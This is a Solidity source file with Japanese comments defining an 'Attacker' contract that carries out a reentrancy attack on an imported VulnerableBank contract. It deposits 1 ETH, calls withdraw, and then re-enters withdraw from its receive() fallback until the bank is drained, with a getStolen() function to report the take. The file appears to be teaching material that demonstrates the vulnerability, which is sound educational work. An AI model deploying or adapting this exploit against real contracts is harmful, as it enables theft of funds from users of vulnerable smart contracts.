// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./VulnerableBank.sol";

// 🔥 攻撃者のコントラクト
contract Attacker {
    VulnerableBank public bank;
    uint256 public attackCount;
    
    constructor(address _bankAddress) {
        bank = VulnerableBank(_bankAddress);
    }
    
    // 攻撃開始
    function attack() public payable {
        require(msg.value >= 1 ether, "Need at least 1 ETH to attack");
        
        // 1. まず銀行に預金
        bank.deposit{value: 1 ether}();
        
        // 2. 引き出しを開始（ここからReentrancy攻撃が始まる）
        bank.withdraw();
    }
    
    // 🔥 ここが重要！お金を受け取ると自動実行される
    receive() external payable {
        attackCount++;
        
        // 銀行にまだお金があれば、もう一度引き出す
        if (address(bank).balance >= 1 ether) {
            bank.withdraw(); // ← Reentrancy攻撃！
        }
    }
    
    // 盗んだお金を確認
    function getStolen() public view returns (uint256) {
        return address(this).balance;
    }
}
